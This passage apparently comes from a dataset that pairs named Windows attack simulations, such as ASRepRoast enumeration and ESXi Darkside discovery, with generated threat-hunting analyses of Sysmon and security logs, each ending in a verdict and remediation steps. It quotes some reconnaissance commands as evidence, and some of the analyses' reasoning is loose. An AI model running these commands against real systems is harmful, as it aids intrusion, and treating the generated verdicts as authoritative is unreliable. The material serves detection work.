   - The absence of significant events in the System log does not immediately raise any concerns but should be considered together with other logs.

### Conclusion:

Considering the outlined analysis, the behavior observed can be categorized into the following resolution:

- **MALICIOUS**: The evidence of PowerShell script execution downloaded from an external source strongly indicates unauthorized or malicious activity. The presence of internet-based script execution and elevated system interactions pose a risk that aligns with typical Windows attack vectors.

### Guidance:
1. **Isolate the Affected Machine**: Immediately isolate the machine from the network to prevent further potential malicious activity or lateral movement within the network.
2. **Investigate the Script**: Obtain and analyze the script being downloaded from GitHub. Determine its purpose and whether it contains malware or harmful operations.
3. **Review User Privileges**: Verify the accounts involved in the logs, specifically `admin_test`, to check for any unauthorized privilege changes.
4. **Conduct a Full Security Assessment**: Perform a comprehensive review of the system and other interconnected systems for additional signs of compromise.
5. **Disallow External Script Execution**: Implement security controls to block execution of scripts from external and untrusted sources at the PowerShell level.

It is critical to engage with the IT team to act quickly on network security measures and possibly involve legal or cyberforensics teams if a breach is suspected."
System Owner-User Discovery Using Command Prompt,"Upon reviewing the provided logs, here is the detailed analysis of the events observed:

### System Log:

### Security Log:
- All events captured are related to Windows Security Auditing with Event ID 5379, which generally relates to credential validation failures. The return code `3221226021` usually indicates a ""Status Logon Failure."" The repeated attempts to access MicrosoftAccount and WindowsLive resources by `SERVER002$` could indicate failed attempts to authenticate using these services. This behavior, if unexpected, could be suspicious, but it is not conclusive enough to label as malicious on its own, as there can be benign reasons for such logon failures on a system.

### Sysmon Log:
- A series of process creations involving system utilities such as `wevtutil.exe`, `conhost.exe`, `hostname.exe`, `whoami.exe`, `cmd.exe`, `net.exe`, `net1.exe`, `wuauclt.exe`, and `MpSigStub.exe` are captured.
- The execution of `cmd.exe` with command-line arguments to generate user info files and list users (using `net users`, `query user`) can be considered suspicious, especially if unexplained by legitimate administrative tasks.
- The presence of processes like `whoami.exe` and networking/testing utilities can suggest a reconnaissance attempt if there is no known administration activity occurring at the time.
- The `MpSigStub.exe` and `AM_Delta.exe` entries are part of legitimate update processes by Windows Update and Microsoft Defender.

### Application Log:
- Only a single entry is captured indicating that Windows Defender is operational, which is normal and expected.

### Assessment:
The logs contain a combination of routine update-related activities and system command executions. The use of command prompt and system utilities, along with failed credential checks, could indicate a potential reconnaissance or information gathering attempt if unexplained by normal administrative activities. However, there's no definitive evidence of malicious compromise within this limited dataset.

### Resolution:
**SUSPICIOUS** - The activity in the Windows Sysmon log, such as the execution of multiple utilities and command-line arguments to collect user information, can be categorized as suspicious if it doesn't align with normal administrative tasks. Further investigation is required to clarify the context of these activities and verify whether they are legitimate or unauthorized.

### Guidance on How to Proceed:
- **Verify the Context**: Determine if these activities correspond with legitimate administrative activities or maintenance tasks.
- **Check for Other Indicators**: Review other security and application logs to identify any additional indicators of compromise.
- **Network Traffic Analysis**: Assess network logs for any unusual outbound connections during this timeframe.

List Open Egress Ports,"### Detailed Analysis of the Logs

#### Suspicious or Anomalous Behavior:

1. **PowerShell Script Execution:**
   - There are multiple PowerShell events indicating the execution of a script. The script reads a list of port numbers from a file (`C:\\Users\\ADMIN_~1\\AppData\\Local\\Temp\\file\\data\\src\\top-128.txt`) and checks connectivity to a domain named `allports.exposed`, logging the results.
   - This behavior suggests a potential port scanning activity, which could be indicative of reconnaissance, an early stage in the attack lifecycle.

2. **Usage of `wevtutil.exe`:**
   - Logs show numerous processes with `wevtutil.exe`. This utility is used to manage event logs. Frequent or unusual use may suggest an attempt to manipulate or clear logs to cover tracks.

3. **High Integrity Level Process Execution:**
   - The processes executed by `SERVER002\\admin_test` include `PowerShell.exe`, `hostname.exe`, `whoami.exe`, and `conhost.exe`, all at a high integrity level. This pattern reiterates some of the reconnaissance behaviors, possibly using `whoami` to verify the environment context (i.e., understanding user permissions).

4. **Execution of `HOSTNAME.EXE` and `WHOAMI.EXE`:**
   - The execution of `hostname.exe` and `whoami.exe` also suggests system reconnaissance attempts to gather system and user information.

5. **Connection Attempts to a Potential Malicious Domain:**
   - The domain `allports.exposed` engaged by the script is suspicious, suggesting potential exploratory or malicious activity—especially as part of a recon script striving to identify open ports on remote systems.

#### Assessment of Malicious Activity:

- The pattern of activity centering around PowerShell and specific executable executions with elevated privileges, alongside engaging with suspicious external domains, indicates behavior not typically seen in day-to-day administrative tasks. 
- The combination of potentially altered logs (`wevtutil.exe` usage) and numerous system commands aligns with attacker behaviors aiming for persistence and network mapping within an environment.

### Threats or Risks Identified

- **Network Reconnaissance:** There is a high risk that the host is being used for reconnaissance activities within the network, gathering critical information for further exploitation or lateral movement.
- **Potential Cover-Up Actions:** Usage of `wevtutil.exe` might be an indication of log tampering, suggesting attempts to cover tracks or stealthy operations.

### Recommended Action

- Investigate further by looking into interactions with the domain `allports.exposed` to understand full scope.
- The security teams should analyze other systems in the network for similar activities potentially from this host.

### Resolution

**MALICIOUS** - Based on the script activity involving port scanning and the exploitation context it suggests, coupled with high integrity access executions and potential log tampering efforts, these behaviors align with malicious reconnaissance activities typically seen during an initial breach or network exploration phase. Immediate action is required to address and mitigate any potential compromises from this activity."
ESXi - Darkside system information discovery,"After analyzing the provided Windows event logs, here's a detailed assessment of the situation:

### Suspicious and Anomalous Behavior:

1. **PowerShell Execution:**
   - The logs show instances of `powershell.exe` being executed by the user `SERVER002\admin_test`, but without detailed command-line arguments, which is often associated with potential misuse or malicious activity.

2. **Use of Third-Party Tools:**
   - The execution of `plink.exe`, a command-line SSH tool, is noteworthy. It was launched through `cmd.exe` with root privileges and uses a password, suggesting potentially unauthorized remote access. The command is:
     ```
     ""cmd.exe"" /c echo """" | ""C:\Users\ADMIN_~1\AppData\Local\Temp\file\..\Externalfiles\plink.exe"" ""file.local"" -ssh  -l ""root"" -pw ""pass"" -m ""C:\Users\ADMIN_~1\AppData\Local\Temp\file\data\src\esx_darkside_discovery.txt""
     ```
   - The use of `plink.exe` with administrative privileges and a plain-text password is inherently suspicious and suggests potential malicious intent.

3. **Processes Executing Command-Line Utilities:**
   - Multiple executions of `wevtutil.exe` and `whoami.exe` can indicate enumeration activities, often a precursor to suspicious actions like log deletion or user session hijacking.

4. **Command-Line with References to Potentially Malicious Paths:**
   - Paths like `C:\Users\ADMIN_~1\AppData\Local\Temp\file\..` with tools like `plink.exe` and potential shell scripts indicate potentially malicious behavior, as these paths often host transient or unauthorized tools used to execute malicious scripts.

5. **Abnormal User Activity:**
   - Many events are logged under the user `SERVER002\admin_test`, suggesting this account might either be misused or compromised, particularly given the activity around executing unauthorized tools and scripts.

### Indicators of Malicious Activity or Compromise:

- **Credential Harvesting Attempt:**
  - The use of `plink.exe` with administrative credentials suggests a potential credential harvesting attempt or unauthorized access to another system.

PowerShell Network Sniffing,"### Detailed Analysis:

#### Observations:

1. **Unusual PowerShell Activity:**
   - **Event Record ID 17965:** The PowerShell command executed includes network packet capture operations. The command parameters `New-NetEventSession`, `Add-NetEventPacketCaptureProvider`, `Start-NetEventSession`, `Stop-NetEventSession`, and `Remove-NetEventSession` are for network monitoring or capturing. This is sensitive and typically associated with more advanced users or potentially malicious behavior.
   - **Windows PowerShell Log Events :** The PowerShell session starting with this command was logged, which suggests proactive monitoring of network traffic. This script could potentially be part of benign administrative tasks, but it could also indicate reconnaissance activities if unauthorized.

2. **Process Executions:**
   - Frequent execution of `conhost.exe` and `wevtutil.exe` was noted but did not exhibit any malicious command-line arguments. The context suggests interaction with event logs, normal in some administrative operations but could be exploited for log tampering.
   - Execution of `hostname.exe` and `whoami.exe` is seen, which are not inherently malicious but can be part of enumeration activities in a malicious context.

3. **Security Event Logs:**
   - **Event ID 4672:** This indicates privileged user activity. The admin user `admin_test` executed commands with several elevated privileges. This isn't inherently malicious but should be validated to ensure it matches expected administrative operations.
   - **Event ID 4624:** Indicates a successful logon using NTLM authentication, which is not inherently suspicious but needs to be expected.

4. **System and Security Logs Indicate Time Change:**
   - **System Log Event ID 1 and Security Log Event ID 4616:** An observed time change could indicate attempts to potentially falsify time-based logs. This is usually considered suspicious activity and can be part of covering tracks.

#### Assessment:

The logs reveal potentially suspicious activity, primarily the execution of a PowerShell command designed to capture network traffic, along with time changes in the system logs. These activities, while potentially part of legitimate administrative tasks, could also indicate unauthorized reconnaissance or preparation for lateral movement within the network if linked to unauthorized user actions.

### Threats or Risks:
- **Potential Misuse of PowerShell Commands:** If the `Capture007` command was not part of authorized administrative activity, it poses a significant risk of sensitive data exposure.
- **Time Manipulation:** Any unintended or unexplained time adjustments can indicate attempts to bypass logging and detection mechanisms.
  
### Guidance on How to Proceed:
1. **Immediate Review:** Verify the legitimacy of the PowerShell script execution. Check with the system administrators if this was a planned and documented task.
2. **Privileged Access Review:** Verify if the privileged access and commands issued by `admin_test` align with expected and documented administrative actions.
3. **Audit and Monitor:** Enhance monitoring on the host for abnormal spikes in network activity or unusual processes linked to administrative tools.
4. **Time Manipulation Investigation:** Review associated logs and configurations to rule out further time manipulation and ensure synchronization with an authoritative time source.

### Resolution: 
**SUSPICIOUS**

The logs contain activities that raise concerns and warrant further investigation to determine whether these are part of legitimate administrative tasks or indicative of malicious behavior."
Find and Display Internet Explorer Browser Version,"Upon reviewing the provided event logs, here is the detailed analysis with key observations:

### Suspicious or Anomalous Behavior:
1. **Frequent Execution of `wevtutil.exe`**: 
   - The `wevtutil.exe` utility, used for managing Windows Event Logs, was executed multiple times in rapid succession by the user `SERVER002\admin_test`. This behavior could indicate attempts to clear or export event logs, potentially hiding malicious actions.

2. **Use of `cmd.exe` for Registry Query**: 
   - `cmd.exe` was executed with a command to query the registry key related to Internet Explorer. The command line `\""cmd.exe\"" /c reg query \""HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Internet Explorer\"" /v svcVersion` suggests a query likely checking for software versions. While not inherently malicious, frequent or abnormal use may warrant further scrutiny.

3. **`whoami.exe` and `hostname.exe` Execution**:
   - The `whoami.exe` and `hostname.exe` commands were executed. These can be part of reconnaissance actions to determine user context and system identity. Such commands, if executed unexpectedly or by non-standard users like `admin_test`, could indicate prep work for further actions.

4. **Time Change Events**:
   - There are Kernel-General events indicating changes in system time. Unauthorized alteration of system time can be suspicious, potentially indicating attempts to manipulate timestamps on files or logs. The changes were executed by `svchost.exe`, a common host process used by legitimate services, yet also frequently abused.

### Indicators of Potential Compromise:
- The combination of using command-line tools for system information gathering (`whoami`, `hostname`), managing logs (`wevtutil`), and querying the registry (`reg.exe`) can align with a pattern of behavior seen in lateral movement or preparation for privilege escalation by attackers.
- Frequent and systematic execution of Windows utilities without an apparent legitimate administrative task context raises red flags.

### Final Assessment:
Given the observed behaviors, notably the rapid execution of potentially investigatory and log management commands, these logs display signs of possible malicious activity that warrants further investigation. It's crucial to determine the legitimacy of the `admin_test` account's actions and the context within which these commands were run.

### Resolution:
**SUSPICIOUS**

### Guidance on How to Proceed:
- **Review User Account Activity**: Confirm the intended actions of the `SERVER002\admin_test` account. Determine if these are routine administrative tasks or unexpected.
- **Investigate Log Management Activities**: Look for additional context or correlated logs that might reveal intentions for clearing or masking event log entries.
- **Monitor and Isolate**: Increase monitoring on this system and isolate if further suspicious activities are detected, particularly around sensitive files or unauthorized data access/export.
- **Conduct a Forensic Analysis**: Consider a deeper forensic analysis of the system to check for signs of compromise, persistence mechanisms, or lateral movement attempts.
- **Check for Similar Patterns**: Review other systems on the network for similar patterns of behavior, which could indicate a broader issue."
System Time with Windows time Command,"Based on the provided logs, I have carried out a detailed analysis of the events that occurred on the system, Server002. Here is a breakdown of the findings:

### Key Observations:

1. **EventID 4672 from the Security Event Logs:**
   - This event indicates that a privileged account (`admin_test`) logged onto the system with high-privilege tokens (`SeSecurityPrivilege, SeBackupPrivilege, SeRestorePrivilege, SeTakeOwnershipPrivilege, SeDebugPrivilege, etc.`). The `SeDebugPrivilege` is of particular interest as it can be potentially used for malicious purposes, such as injecting code into other processes, which is a common technique for malware activities.

2. **EventID 4624 from the Security Event Logs:**
   - The same user, `admin_test`, successfully logged on using NTLM authentication type from a workstation called `DESKTOP-3HL5B2P`, which initiated the logon. This suggests remote access, which is normal in many networked environments but should be cross-verified for legitimacy.

3. **Sysmon Logs:**
   - Multiple executions of system utilities like `whoami.exe`, `wevtutil.exe`, and `conhost.exe` were noted. Frequent invocation of these utilities, especially without an apparent administrative task, can suggest enumeration or log manipulation attempts which could be suspicious, especially following administrative logon.
   - Execution of `cmd.exe` with the `/c time` command by `admin_test` suggests an adjustment or verification of system time, which can sometimes be modified in an attempt to evade certain time-based security controls.
   - Numerous executions of Microsoft Edge Update processes (`MicrosoftEdgeUpdate.exe`) and installers, both system and service level, indicate routine software updates. These entries, given their nature and SHA256 hashes being standard Microsoft updates, appear benign.

4. **System Logs:**
   - Time synchronization events involving `svchost.exe` indicate routine network time protocol adjustments. While synchronization is regular, its occurrence alongside suspicious activities needs careful examination for tampering.

5. **Application Logs:**
   - Entries from `Microsoft-Windows-Security-SPP` and `edgeupdate` indicate routine service operations like starting and stopping of the edge update service, which are benign.

### Assessment:

- **Suspicious Behavior:**
  - The use of high-privilege tokens and invocation of process utilities post-privileged login resembles potential reconnaissance or preparatory steps for a larger attack vector. Despite these utility uses sometimes being part of legitimate administrative tasks, they warrant scrutiny due to their occurrence in proximity to the privileged logon event.

- **Benign Activities:**
  - The majority of `MicrosoftEdgeUpdate.exe` related entries are standard and common during update cycles for software applications. No anomalies are present here given the valid signatures and hash details.

### Conclusion:

**Resolution**: **SUSPICIOUS**

The logs reveal potential suspicious activities due to the granting of excessive privileges and executed commands by the user `admin_test`. Further investigation is warranted to affirm the user's intent, correlate actions with legitimate tasks, and ensure no misuse of privileges potentially compromising the system.

### Guidance:

1. **Validate User Actions:**
   - Verify the legitimacy of the remote logon by `admin_test` and cross-reference with operations performed. Check if these actions align with routine administrative procedures.

2. **Monitor and Audit Logs:**
   - Conduct a thorough audit of the user's activities across different systems. Monitor ongoing logons and any high-risk activity.

3. **Review and Harden Privileges:**
   - Reassess allocated user privileges, particularly scrutinizing those with `SeDebugPrivilege`.

4. **Forensic Readiness:**
   - Be prepared to perform deeper forensics if future activities display malicious intent signs or indicators of a breach.

5. **User Awareness and Training:**
   - Depending on the findings, reinforce security awareness around privilege use among administrators and high-privilege account holders."
Network Share Discovery via dir command,"Based on the provided logs from the Sysmon and Application sources, here is a detailed analysis of the observed activities:

### Analysis:

1. **Sysmon Logs:**
   - **Microsoft Edge Update Activities:** The logs show multiple instances of `MicrosoftEdgeUpdate.exe` being executed. These processes are legitimate Microsoft Edge update mechanisms. They create and execute processes like `MicrosoftEdgeUpdateSetup_X86` and `MicrosoftEdgeUpdateComRegisterShell64.exe`. The presence of these processes themselves is typically associated with regular browser updates unless found to be heavily obfuscated or placed in unusual locations, which is not the case here.
   
   - **Command Execution:**
     - The log captures a command executed using `cmd.exe` with the command line: `cmd.exe /c dir \\127.0.0.1\c$ & dir \\127.0.0.1\admin$ & dir \\127.0.0.1\IPC$`. This command lists directories on the local system using administrative shares. Such command usage by user `SERVER002\\admin_test` on a system can be suspicious if it is done outside of regular system administration and monitoring activity. This behavior should trigger further investigation to confirm its legitimacy.
     
   - **Use of `whoami.exe`:** There are several executions of `whoami.exe` to identify the logged-on user information. While legitimate in certain administrative contexts, frequent unexplained occurrences can be signs of reconnaissance as attackers may use this command to understand the privileges of compromised accounts. It's crucial to ascertain why `admin_test` user was performing such actions.

2. **Application Logs:**
   - There is a service stop recorded for the Edge update service, but no additional context is provided in the logs. 
   - A Software Protection Platform Service log entry indicating potential time or rule change, which is part of regular Windows activity unless there's evidence suggesting misconfiguration or tampering.

### Assessment:

- The **Microsoft Edge Update** entries largely suggest routine update processes attributed to the operating system's legitimate operations by `NT AUTHORITY\SYSTEM`, a privileged built-in user deserving system trust unless being impersonated or manipulated.
- The execution of **CMD commands** that list directories of administrative shares requires further scrutiny. Such activity is not typical from the `admin_test` account unless it's part of normal duties, e.g., software deployments, configurations, or backups.
- **`whoami.exe` executions** appear excessive if not corresponding to legitimate administrative tasks. Their presence could indicate reconnaissance attempts on the user privileges and identify what access levels different credentials have.

### Resolution:

Based on the analysis, while most of the activities align with legitimate system operations, the use of administrative share listing commands in conjunction with frequent `whoami.exe` executions, positions these events towards possible suspicion needing further investigation.

**Resolution: SUSPICIOUS**

### Guidance:

- Conduct a deeper investigation into the context around the `cmd.exe` and `whoami.exe` executions. Validate against scheduled tasks, software installs, or user actions.
- Review user account activities (`admin_test`) during the specific timeframe to understand if these actions align with approved administrative activities.
- Check for any unusual network or file changes stemming from the PC post the outlined activities to recognize any anomalies in system usage.
- If not part of usual maintenance routines, consider monitoring or terminating associated accounts or services until the activities are fully understood and deemed safe."
WinPwn - shareenumeration,"### Detailed Analysis and Assessment

#### 1. **System Logs**

- The System logs reflect typical operations such as time changes related to daylight savings or system clock synchronization. These time changes were carried out by the legitimate Windows process `svchost.exe`. 
- Windows Update processes and security intelligence updates for Microsoft Defender Antivirus denote regular update activities, with logs showing successful updates being pushed ensures that the system is maintained in a secure state.

#### 2. **Application Logs**

- Windows Defender is enabled (`SECURITY_PRODUCT_STATE_ON`), which indicates that antivirus protections are active.
- The stopping of the `edgeupdate` service is noted, which seems to be executed post update; a typical and benign behavior post-Edge update.

#### 3. **PowerShell Logs**

- There is a suspicious PowerShell activity maneuvered from a seemingly external script hosted on `githubusercontent.com`. This script execution using PowerShell should be scrutinized as it fetches content from an external (potentially untrusted) domain and might be capable of executing harmful instructions. This is a red flag for possible malicious activity.
- The script repository URI and its execution context (from PowerShell) imply that this might be an execution of a potentially unauthorized tool or backdoor.

#### 4. **Sysmon Logs**

- There are multiple entries for standard Windows processes, such as `wevtutil.exe`, `whoami.exe`, and numerous `EdgeUpdate.exe` processes. Most `EdgeUpdate.exe` activities are aligned with scheduled system updates, seem benign, and occur with SYSTEM user rights as expected.
- Repeated execution of PowerShell, associated with suspicious command download, being launched from `wsmprovhost.exe` (Windows management host process), contributes to the suspicious PowerShell execution identified. This can indicate lateral movement or internal reconnaissance attempts.
- Execution of `whoami.exe` and system processes with elevated privileges (`High Integrity Level`) should be monitored, although they are often used during administrative tasks, in context, they can signify reconnaissance activity performed by an attacker.

#### 5. **Security Logs**

- Security logs depict time synchronization activities without notable anomalies, aligning with regular background system tasks.<br> 

#### Threats and Risks Identified:
- **Suspicious PowerShell Activity**: Downloading and running a script from the internet via PowerShell poses a significant security threat, potentially opening up the system to remote execution vulnerabilities.

### Final Assessment and Resolution

- **Resolution**: **MALICIOUS**

There is evidence of internet-hosted scripts being fetched through PowerShell, indicating unauthorized remote code execution, typical of initial access brokers or lateral movement attempts by sophisticated threat actors. The presence of suspicious PowerShell invocation represents a malicious activity necessitating immediate containment and in-depth investigation.

### Guidance on How to Proceed
- **Containment and Eradication**: Isolate the affected system (CEO's machine and potentially connected networks) to prevent lateral movements and further data breach. Terminate malicious PowerShell processes and block its command-and-control domain.
- **Investigation**: Analyze the fetched script and conduct a thorough review to comprehend its motives and configurations. Review network traffic for additional traces of unauthorized activity.
- **Recovery and Hardening**: Reimage the affected system, update all software, review current security measures, strengthen boundary firewalls, and ensure endpoint protections are fully operational and updated.
- **Post-Incident Action**: Perform a detailed incident report and ensure continuous monitoring to detect further attempts across related business-critical devices."
Enumerate Users Not Requiring Pre Auth (ASRepRoast),"### Detailed Analysis of Logs

#### Identified Behaviors:

1. **Frequent Execution of System Tools:**
   - The logs show multiple executions of typical Windows system utilities like `powershell.exe`, `wevtutil.exe`, `wermgr.exe`, and `conhost.exe` by the user `SERVER002\admin_test`. This frequent execution could be routine, but the context and nature of these utilities' usage need closer scrutiny.
   
2. **Use of `wevtutil.exe`:**
   - The tool `wevtutil.exe` is executed multiple times (recorded in Event IDs: 18012, 18016, 18020, 18024, 18028, 18032), used to manage and display event logs. This can be suspicious if used to clear logs or export logs in a suspicious context.

3. **PowerShell Usage with Suspicious Command:**
   - The PowerShell log records (Event IDs: 18038-18040) a command that queries for Active Directory users who do not require pre-authentication. This usage suggests potential reconnaissance activity to identify users for a targeted attack.

4. **Event Logging and Handling:**
   - System logs show handling with `wsmprovhost.exe`, which could be a legitimate operation depending on its context within a secure environment. However, its initiation and subsequent handling through processes like `HOSTNAME.EXE` and `whoami.exe` require comprehensive investigation as it may indicate enumeration or sideloading activity.

5. **Execution by System-Level User:**
   - The process executions for the Edge installer (Event IDs: 18043-18045) originated from `NT AUTHORITY\SYSTEM`, indicating a routine update. However, monitoring these updates for anomalies is essential due to their high-level permissions.

#### Assessment of Situational Threats:

- **Unusual Potential Reconnaissance Activity:**
  The PowerShell command used (`get-aduser -f * -pr DoesNotRequirePreAuth | where {$_.DoesNotRequirePreAuth -eq $TRUE}`) is indicative of a potential reconnaissance strategy. While administrative users may sometimes execute commands for legitimate audits, the context here, combined with `wevtutil.exe` usage, raises concern for possible illicit intentions such as the prelude to Kerberoasting attacks.
  
- **Log Data Exfiltration Risk:**
  The usage of `wevtutil.exe` for exporting event logs could indicate data exfiltration efforts or an attempt to cover tracks by clearing logs.

#### Final Assessment and Resolution:

- **Resolution: SUSPICIOUS**
  While the logs do not exhibit concrete evidence of malicious actions like malware deployment or unauthorized data modification, the combination of reconnaissance-like PowerShell usage and frequent `wevtutil.exe` operations suggest the need for further investigation. The analytical effort should focus on verifying the rationale for these commands and monitoring for any pattern indicating data manipulation or attempts to exploit information vectors."
List Internet Explorer Bookmarks using the command prompt,"Upon reviewing the provided logs, here is a detailed analysis of the key events:

1. **System Log Analysis**:
   - The Windows Kernel events mainly report time adjustments. These adjustments might be a concern if they are not expected, but it is a common operation performed by the Windows Time Service (`time.windows.com`). The `svchost.exe` process, which interacts with the time service, is a legitimate Windows process. These entries do not exhibit suspicious behavior on their own.

2. **Application Log Analysis**:
   - The application log shows the stopping of the `edgeupdate` service twice. There is no additional context or irregular pattern here than standard updates or potential errors.

3. **Security Log Analysis**:
   - These logs detail security auditing events for time changes, similar to the system logs, indicating collaboration between `svchost.exe` and security auditing processes. Given the context, there are no indicators of malicious activity here.

4. **Sysmon Log Analysis**:
   - The Sysmon logs report various processes executions:
     - Legitimate Windows processes like `wevtutil.exe`, `conhost.exe`, `hostname.exe`, `whoami.exe`, and `cmd.exe` are recorded acting on commands that are not inherently suspicious.
     - Repeated instances of Microsoft Edge Update processes such as `MicrosoftEdgeUpdate.exe` and its components executing with different command-line arguments are recorded. This activity is expected from standard operations during software updates. It may appear frequent, but they predominantly follow expected patterns and scheduled update processes.

Overall, the logs largely consist of expected system administration tasks and updates. None of the events stand out as definitively malicious. The frequent execution of edge update processes aligns with typical browser update behavior and therefore doesn’t strongly indicate compromise.

### Final Assessment:
- **Resolution**: BENIGN

No direct evidence of malicious activity has been observed in these logs. They reflect normal system updates and time synchronization activities. While frequent Microsoft Edge updates might require assurance of their legitimacy, they are common. If there's concern about the validity of the update paths, a verification against a trusted software source could be conducted as a precaution."
TruffleSnout - Listing AD Infrastructure,"Based on the analysis of the provided logs, here's a detailed assessment focusing on any signs of suspicious or potentially malicious activity:

### Observations:

1. **Unusual Execution of PowerShell and Command Line Tools:**
   - PowerShell (`powershell.exe`) was executed under the user account `SERVER002\\admin_test`. While PowerShell can be used for legitimate administrative purposes, its usage is also a common tactic in malicious activity, especially if not typical for the user's behavior.
   - The execution of `wevtutil.exe` several times in conjunction with `conhost.exe` is noteworthy as `wevtutil` is used to manage Windows Event logs, which might indicate attempts to clear or tamper with logs.
   - The presence of `cmd.exe` running with the command line invoking `TruffleSnout.exe` with arguments potentially related to domain information (`forest` and `domain` flags) is suspicious. This could be indicative of reconnaissance or data exfiltration attempts.

2. **Processes Executed:**
   - The usage of `whoami.exe` and `hostname.exe` can be considered standard for some administrative tasks. However, combined with other contextually concerning activity in this timeframe, they may indicate enumeration activity to gather system and user context.
   - The execution directory for `TruffleSnout.exe` being in a temporary folder (`C:\\Users\\ADMIN_~1\\AppData\\Local\\Temp\\file\\..\\Externalfiles\\TruffleSnout.exe`) is often associated with malicious operations, as attackers commonly download and execute payloads from temporary locations.

3. **Patterns and User Activity:**
   - The sequence of events involving common administrative tools suggests an automated script or a knowledgeable operator conducting potentially unauthorized or malicious operations.

### Assessment:

The combination of PowerShell execution, the use of `wevtutil` potentially for log cleaning, command line exploration, and the execution of a suspicious executable (`TruffleSnout.exe`) suggests activities that typically align with threat actor tactics aimed at reconnaissance and stealth log management. These actions, especially in combination, display hallmarks of potential compromise.

### Resolution:

- **SUSPICIOUS:** The activities observed in the logs, such as the execution of `TruffleSnout.exe` with arguments consistent with domain enumeration and the use of `wevtutil.exe`, warrant further investigation. This determination is based on the suspicion that these actions could be part of a larger intrusion attempt or unauthorized access.

### Recommendations:

1. **Immediate Attention:**
   - Isolate the affected machine (`Server002`) to prevent further potential loss or compromise of data.
   
2. **Further Investigation:**
   - Review the machine’s full PowerShell command history for additional context and potentially malicious scripts.
   - Search for `TruffleSnout.exe` across the environment and analyze its origin and purpose.
   - Investigate the user `admin_test`'s actions and assess any deviations from normal behavior patterns.

3. **Mitigation Measures:**
   - Consider enhancing monitoring on administrative and critical systems.
   - Evaluate and restrict PowerShell usage and access to administrative tools only to necessary personnel.
   - Implement stricter control and review for execution of any binaries from temporary directories.

These measures should help in confirming or dismissing the suspicious activities and aid in preventing future incidents."
Query Registry with Powershell cmdlets,"Upon analyzing the provided logs, here is a detailed assessment:

1. **Application Log:**
   - The log entry from Windows Defender indicates that it is in a healthy state (`SECURITY_PRODUCT_STATE_ON`), which typically means no immediate threats were detected by the Windows Defender.

2. **PowerShell Log:**
   - Several PowerShell commands were executed that query various registry paths. This extensive registry access, including locations such as `RunServices`, `Winlogon`, `ShellServiceObjectDelayLoad`, among others, can be associated with attempts to enumerate system settings or persistence mechanisms.
   - The use of PowerShell to extensively scrutinize such registry paths can sometimes be indicative of reconnaissance activities or an attempt to discover potential security weaknesses.

3. **Sysmon Log:**
   - A process named `whoami.exe` and multiple instances of `conhost.exe` were executed by the user `SERVER002\admin_test`. Using `whoami` to check the logged user context can sometimes be benign, but might be used by attackers to confirm the privileges they have obtained.
   - There are multiple instances of `wevtutil.exe`, which is often used to manage event logs. Its frequent invocation could indicate log scraping or tampering activities, especially if aligned with suspicious behavior.
   - Among the Sysmon logs, normal system activities such as Microsoft Edge updates, Windows Update processes (`wuauclt.exe`), and anti-malware updates are observed. These entries do not immediately suggest malicious activity.

4. **System Log:**
   - Consistent with normal behavior, there are Windows Update events related to Microsoft Defender Antivirus updates. These updates and operations appear legitimate and routine.

5. **Security Log:**
   - Credentials access events (`EventID 5379`) are present, attempting to access `MicrosoftAccount` and `WindowsLive` credentials, which failed based on `ReturnCode 3221226021`. These events could indicate attempted unauthorized access to stored credentials, requiring further review.

### Assessment:

- **Suspicious Behavior:**
  - The comprehensive registry access through PowerShell and the frequent invocation of `wevtutil.exe` suggest potentially suspicious behavior. While these actions might coincide with legitimate administrative tasks, their pattern, especially if unexpected or without documented cause, necessitates caution.
  - The failed credential access events in the security logs could raise flags regarding unauthorized access attempts.

### Resolution:

- **Suspicious:** There are activities identified that warrant further investigation to rule out malicious intent. Specifically, a review of the context and purpose of the registry queries, event log management activities, and failed credential access should be prioritized. Validate whether these activities were part of expected administrative processes. If not, investigate for potential unauthorized access or policy violation.

### Recommendation:

- Conduct a thorough investigation of the user's activities on the system (`SERVER002\admin_test`), focusing on session logs and any associated network activities.
- Review security policies and monitoring rules around PowerShell execution and audit logs for anomalies.
- Ensure the integrity of event logs and verify whether any log alteration attempts were successful.
- Perform endpoint security checks and scan for any indicators of compromise across the system."
System Information Discovery,"Upon reviewing the provided Sysmon, System, Security, Application, and partial PowerShell logs, the following observations and analysis can be made:

1. **Sysmon Logs Overview**: The Sysmon logs provide a detailed trace of process executions on the system. Key points of interest include:
   - Frequent invocations of `wevtutil.exe` (Windows Event Utility) and `conhost.exe` (Console Window Host) by the `admin_test` user. `wevtutil.exe` is normally used to manage and query event logs but can also be used for potentially malicious activities such as clearing logs.
   - Execution of `cmd.exe` with a command line that queries system information (`systeminfo`) and registry (`reg query HKLM\SYSTEM\CurrentControlSet\Services\Disk\Enum`). This could indicate an attempt to gather system information, which is a common activity during enumeration or reconnaissance.
   - Numerous instances of Microsoft Edge Update processes, which are likely related to routine updates and maintenance activities. 

2. **System Logs**: 
   - Time synchronization events are observed, which appear normal. Nothing suspicious stands out in the system logs.

3. **Security Logs**: 
   - Events such as successful logons using NTLM authentication and an array of administrator privileges granted (SeBackupPrivilege, SeDebugPrivilege, etc.) are noted. This indicates a high-level account (`admin_test`) executing these processes.
   - Logon types and source IP addresses do not immediately suggest unauthorized access, though the use of NTLM and a remote IP address (192.168.0.102) should be verified against expected behavior and access policies.

4. **Application Logs**: 
   - Notice the `edgeupdate` service stop events, which typically correspond to regular updates and not necessarily suspicious by themselves.

5. **Potentially Suspicious Activity**:
   - The querying of system information and registry entries from a command prompt stands out due to its association with recon activities. Executing `systeminfo` and `reg query` commands can be part of an enumeration script or manual probing by an attacker to gather insights into system details and configurations.

6. **Overall Assessment**:
   - **SUSPICIOUS**: Based on the analysis, the logs contain activities that do not immediately raise overt red flags but could potentially indicate unauthorized or malicious reconnaissance if such behavior is deemed unexpected for the `admin_test` user or their corresponding activities aren't explicitly vetted against business needs or practices. Further investigation should be conducted to:
     - Confirm whether the commands executed via `cmd.exe` were part of authorized scripts or tasks.
     - Assess whether the IP address (192.168.0.102) is an expected source based on authorized access and internal network maps.
     - Verify if there are any IOC signatures associated with the usage of `wevtutil.exe` under `admin_test`.

**Next Steps**:
- Cross-reference user activity during the timestamps for anything unusual.
- Check whether any recent IT changes required such extensive logging or registry queries.
- If unauthorized activity is suspected, consider enhancing audit trails and employing targeted threat hunting strategies specific to the identified behaviors."
Simulating MAZE Directory Enumeration,"Upon analyzing the provided Windows event logs, several key observations can be made which highlight potential suspicious activity:

### Suspicious Activity Observed:

1. **PowerShell Script Execution**:
